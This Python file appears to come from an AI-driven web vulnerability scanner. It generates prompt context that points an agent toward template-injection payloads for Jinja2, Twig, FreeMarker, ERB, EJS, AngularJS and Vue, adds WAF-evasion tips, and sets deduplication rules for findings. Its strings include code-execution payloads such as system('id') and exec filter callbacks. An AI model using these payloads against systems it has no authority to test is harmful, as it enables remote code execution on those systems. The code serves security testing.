"""TechContext shell mixin — extracted for size policy."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Dict, List, Optional

from bugtrace.utils.logger import get_logger
from bugtrace.agents.mixins.tech_context.constants import (
    FRAMEWORK_TO_DB,
    SERVER_TO_LANG,
    TAG_TO_DB,
)

logger = get_logger("tech_context_mixin")


class TechContextCstiMixin:
    def generate_csti_context_prompt(self, stack: Dict) -> str:
        """
        Generate CSTI/SSTI-specific 'Prime Directive' context block for LLM prompts.

        This context helps the LLM focus on relevant template injection payloads
        based on the detected technology stack.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted CSTI-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        frameworks = stack.get("frameworks", [])
        waf = stack.get("waf")
        raw_profile = stack.get("raw_profile", {})

        # Detect template engines from tech profile
        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        detected_engines = self._detect_template_engines(frameworks, tech_tags, lang)

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (CSTI/SSTI CONTEXT)",
            f"- Backend Language: {lang}",
        ]

        if detected_engines:
            prompt_parts.append(f"- Detected Template Engines: {', '.join(detected_engines)}")

        if frameworks:
            prompt_parts.append(f"- Frameworks: {', '.join(frameworks[:3])}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        # Strategic implications
        prompt_parts.append("")
        prompt_parts.append("## CSTI/SSTI STRATEGIC IMPLICATIONS")
        prompt_parts.append(
            "- Probe arithmetic with 1000003*1000003 (=1000006000009), never 7*7. "
            "49 occurs naturally in page content, so it cannot prove evaluation; the "
            "long product is the only result the confirmation step accepts."
        )

        # Engine-specific guidance
        if "jinja2" in detected_engines or lang == "Python":
            prompt_parts.extend([
                "- Jinja2 (Python): {{ config }}, {{ self.__class__.__mro__ }}",
                "- Jinja2: RCE via __subclasses__(), __globals__, __builtins__",
                "- Jinja2: Test with {{1000003*1000003}}, {{config.items()}}, {{request.application}}",
            ])
        if "twig" in detected_engines or lang == "PHP":
            prompt_parts.extend([
                "- Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}",
                "- Twig: Test with {{1000003*1000003}}, {{app.request.server.all|join(',')}}",
                "- Twig: RCE via filter() function abuse",
            ])
        if "freemarker" in detected_engines or lang == "Java":
            prompt_parts.extend([
                "- FreeMarker (Java): <#assign ex=\"freemarker.template.utility.Execute\"?new()>",
                "- FreeMarker: Test with ${1000003*1000003}, ${.now}, ${product.class.protectionDomain}",
                "- Velocity: #set($x=1000003*1000003)$x, $class.inspect(\"java.lang.Runtime\")",
            ])
        if "erb" in detected_engines or lang == "Ruby":
            prompt_parts.extend([
                "- ERB (Ruby): <%= 1000003*1000003 %>, <%= system('id') %>",
                "- Slim/Haml: Test with = 1000003*1000003, = `id`",
                "- ERB: Code execution via backticks or system()",
            ])
        if "razor" in detected_engines or lang == "ASP.NET":
            prompt_parts.extend([
                "- Razor (ASP.NET): @(1000003*1000003), @Html.Raw(code)",
                "- Razor: Limited SSTI surface, focus on deserialization chains",
            ])
        if "ejs" in detected_engines or lang == "Node.js":
            prompt_parts.extend([
                "- EJS (Node.js): <%- include('file') %>, <%= 1000003*1000003 %>",
                "- Pug/Jade: #{1000003*1000003}, !{userInput}",
                "- EJS: RCE via include with file traversal",
            ])

        # Client-side template injection (CSTI)
        frontend_frameworks = self._detect_frontend_frameworks(frameworks, tech_tags)
        if "angular" in frontend_frameworks:
            prompt_parts.extend([
                "",
                "## CLIENT-SIDE TEMPLATE INJECTION (CSTI)",
                "- AngularJS detected: {{constructor.constructor('alert(1)')()}}",
                "- Angular: Sandbox escapes for versions < 1.6",
                "- Angular: Test with {{1000003*1000003}}, {{$on.constructor('alert(1)')()}}",
            ])
        if "vue" in frontend_frameworks:
            prompt_parts.extend([
                "",
                "## CLIENT-SIDE TEMPLATE INJECTION (CSTI)",
                "- Vue.js detected: {{_c.constructor('alert(1)')()}}",
                "- Vue: v-html directive enables XSS, not CSTI",
                "- Vue: Test with {{1000003*1000003}}, {{constructor.constructor('alert(1)')()}}",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                "",
                f"## WAF EVASION ({waf})",
                "- Use string concatenation: {{'con'+'fig'}}",
                "- Use alternative syntax: {% raw %}...{% endraw %}",
                "- Encoding: Unicode escapes, hex encoding",
                "- Comment injection: {{7*{#comment#}7}}",
            ])

        return "\n".join(prompt_parts)

    def generate_csti_dedup_context(self, stack: Dict) -> str:
        """
        Generate CSTI-specific context for WET→DRY deduplication prompts.

        CSTI deduplication must consider:
        - Template engine type (Jinja2 ≠ Twig ≠ Angular)
        - Client-side vs Server-side (CSTI vs SSTI)
        - Same engine + same parameter = DUPLICATE

        Args:
            stack: Normalized tech stack

        Returns:
            CSTI deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        frameworks = stack.get("frameworks", [])
        raw_profile = stack.get("raw_profile", {})

        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        detected_engines = self._detect_template_engines(frameworks, tech_tags, lang)
        frontend_frameworks = self._detect_frontend_frameworks(frameworks, tech_tags)

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR CSTI DEDUPLICATION",
            f"- Detected Backend: {lang}",
            f"- Detected Engines: {', '.join(detected_engines) if detected_engines else 'Unknown'}",
            f"- Frontend Frameworks: {', '.join(frontend_frameworks) if frontend_frameworks else 'None'}",
            "",
            "## CSTI DEDUPLICATION RULES",
            "",
            "### Engine-Based Deduplication (CRITICAL)",
            "CSTI findings are DIFFERENT if template engine differs:",
            "- Jinja2 (Python) ≠ Twig (PHP) ≠ FreeMarker (Java) ≠ ERB (Ruby)",
            "- Angular (CSTI/client) ≠ Jinja2 (SSTI/server)",
            "- Vue (CSTI/client) ≠ Twig (SSTI/server)",
            "",
            "### Scope Rules",
            "- Same URL + param + engine → DUPLICATE (keep one)",
            "- Same URL + param + DIFFERENT engine → DIFFERENT (keep both)",
            "- Different endpoints → DIFFERENT (keep both)",
            "- Client-side vs Server-side → DIFFERENT vulnerability classes",
            "",
            "### Examples",
            "- /page?name=X (Jinja2) = /page?name=Y (Jinja2) → DUPLICATE",
            "- /page?name=X (Jinja2) ≠ /page?name=Y (Twig) → DIFFERENT engines",
            "- /page?name=X (Angular) ≠ /page?name=Y (Jinja2) → CSTI vs SSTI",
            "- /page?name=X ≠ /other?name=Y → DIFFERENT endpoints",
        ]

        # Add detected engine notes
        if detected_engines:
            context_parts.append("")
            context_parts.append(f"### Priority Engines (from tech profile): {', '.join(detected_engines)}")
            context_parts.append("- Prioritize payloads for these detected engines")

        return "\n".join(context_parts)

    def _detect_template_engines(self, frameworks: List[str], tech_tags: List[str], lang: str) -> List[str]:
        """Detect likely template engines from tech profile and language."""
        detected = []
        all_hints = [f.lower() for f in frameworks] + tech_tags

        # Direct template engine detection
        engine_hints = {
            "jinja2": ["jinja", "jinja2", "flask", "django"],
            "twig": ["twig", "symfony"],
            "freemarker": ["freemarker", "spring"],
            "velocity": ["velocity"],
            "thymeleaf": ["thymeleaf", "spring"],
            "erb": ["erb", "rails", "ruby on rails"],
            "slim": ["slim"],
            "haml": ["haml"],
            "ejs": ["ejs", "express"],
            "pug": ["pug", "jade"],
            "handlebars": ["handlebars", "hbs"],
            "mustache": ["mustache"],
            "razor": ["razor", "asp.net", ".net"],
            "smarty": ["smarty", "php"],
            "mako": ["mako", "pylons"],
        }

        for engine, hints in engine_hints.items():
            if any(hint in " ".join(all_hints) for hint in hints):
                detected.append(engine)

        # Language-based inference if nothing detected
        if not detected:
            lang_to_engines = {
                "Python": ["jinja2"],
                "PHP": ["twig", "smarty"],
                "Java": ["freemarker", "velocity", "thymeleaf"],
                "Ruby": ["erb"],
                "Node.js": ["ejs", "pug"],
                "ASP.NET": ["razor"],
            }
            if lang in lang_to_engines:
                detected.extend(lang_to_engines[lang])

        return detected
